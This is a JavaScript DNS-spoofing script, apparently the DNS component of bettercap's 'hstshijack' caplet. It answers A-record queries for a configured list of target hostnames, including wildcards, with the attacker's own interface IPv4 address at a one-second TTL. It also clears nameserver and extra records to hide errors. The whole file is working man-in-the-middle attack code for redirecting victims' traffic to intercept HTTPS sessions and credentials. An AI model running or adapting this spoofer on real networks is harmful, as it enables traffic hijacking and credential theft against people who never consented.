var addr = env("iface.ipv4");

var hostnames = [];

var Rrtype = {
	None:  0,
	A:     1,
//	CNAME: 5,
//	AAAA:  28,
};

String.prototype.endsWith = function(suffix) {
	return this.slice(-1 * suffix.length) === suffix;
};

String.prototype.isTargeted = function() {
	var target = this.toLowerCase();
	for (a = 0; a < hostnames.length; a++) {
		var hostname = hostnames[a];
		if (hostname[0] === "*") {
			if (target.endsWith(hostname.slice(1) + ".")) return true;
			if (target.endsWith(hostname.slice(1))) return true;
		} else {
			if (target === hostname + ".") return true;
			if (target === hostname) return true;
		}
	}
	return false;
};

function onRequest(req, res) {
	req.Questions.forEach(function(question) {
		if (question.Qtype === Rrtype.A) {
			if (question.Name.isTargeted()) {
				res.Header.Response = true;
				res.Header.RecursionAvailable = true;
				res.Answers = res.Answers.concat({
					A: addr,
					Header: {
						Class: question.Qclass,
						Name: question.Name,
						Rrtype: question.Qtype,
						Ttl: 1,
					},
				});
			}
		}
		// Respond with AAAA records if necessary
	});

	if (res.Header.Response === true && res.Answers.length === 0) {
		res.Header.Rrtype = Rrtype.None;

		// Silence DNS errors by clearing all records
		res.Extras = [];
		res.Nameserver = [];
	}
}

function onLoad() {
	hostnames = env["hstshijack.replacements"].replace(/\s/g, "").toLowerCase().split(",");
}

